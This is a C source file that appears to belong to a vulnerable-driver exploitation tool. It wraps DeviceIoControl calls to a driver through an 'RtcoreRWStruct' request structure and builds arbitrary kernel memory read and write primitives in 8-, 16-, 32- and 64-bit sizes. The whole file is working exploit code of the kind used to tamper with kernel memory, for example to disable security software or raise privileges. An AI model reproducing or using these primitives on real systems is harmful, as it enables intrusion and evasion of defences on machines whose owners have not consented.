#include "utils.h"

DWORD ReadPrimitive(HANDLE hDevice,DWORD64 Address, DWORD32 Size) {
	RtcoreRWStruct ReadStruct = { 0 };
	ReadStruct.Address = Address;
	ReadStruct.castControl = Size;
	
	DWORD bytesReturned;

	DeviceIoControl(
		hDevice,
		IOCTL_READ,
		&ReadStruct,
		sizeof(ReadStruct),
		&ReadStruct,
		sizeof(ReadStruct),
		&bytesReturned,
		NULL
	);
	return ReadStruct.Value;
}

DWORD WritePrimitive(HANDLE hDevice, DWORD64 Address, DWORD32 Size, DWORD32 Value) {
	RtcoreRWStruct ReadStruct = { 0 };
	ReadStruct.Address = Address;
	ReadStruct.castControl = Size;
	ReadStruct.Value = Value;
	DWORD bytesReturned;

	DeviceIoControl(
		hDevice,
		IOCTL_WRITE,
		&ReadStruct,
		sizeof(ReadStruct),
		&ReadStruct,
		sizeof(ReadStruct),
		&bytesReturned,
		NULL
	);
	return ReadStruct.Value;
}

BYTE Read8(HANDLE hDevice, DWORD64 Address) {
	return (BYTE)ReadPrimitive(hDevice, Address, 1);
}

WORD Read16(HANDLE hDevice, DWORD64 Address) {
	return (WORD)ReadPrimitive(hDevice, Address, 2);
}

DWORD Read32(HANDLE hDevice, DWORD64 Address) {
	return ReadPrimitive(hDevice, Address, 4);
}

DWORD64 Read64(HANDLE hDevice, DWORD64 Address) {
	DWORD tmp1 = ReadPrimitive(hDevice, Address, 4);
	DWORD tmp2 = ReadPrimitive(hDevice, Address + 4, 4);

	DWORD64 result = ((DWORD64)tmp2 << 32) | ((DWORD64)tmp1);

	return result;
}

void Write8(HANDLE hDevice, DWORD64 Address, BYTE Value) {
	WritePrimitive(hDevice, Address, 1, (DWORD)Value);
}

void Write16(HANDLE hDevice, DWORD64 Address, WORD Value) {
	WritePrimitive(hDevice, Address, 2, (DWORD)Value);
}

void Write32(HANDLE hDevice, DWORD64 Address, DWORD Value) {
	WritePrimitive(hDevice, Address, 4, (DWORD)Value);
}

void Write64(HANDLE hDevice, DWORD64 Address, DWORD64 Value) {
	DWORD Value1 = (DWORD)(Value >> 32);
	DWORD Value2 = (DWORD)(Value & 0xFFFFFFFF);
	printf("Value 1: %d\nValue 2: %d\n", Value1, Value2);
	WritePrimitive(hDevice, Address, 4, (DWORD)Value2);
	WritePrimitive(hDevice, Address + 4, 4, (DWORD)Value1);
}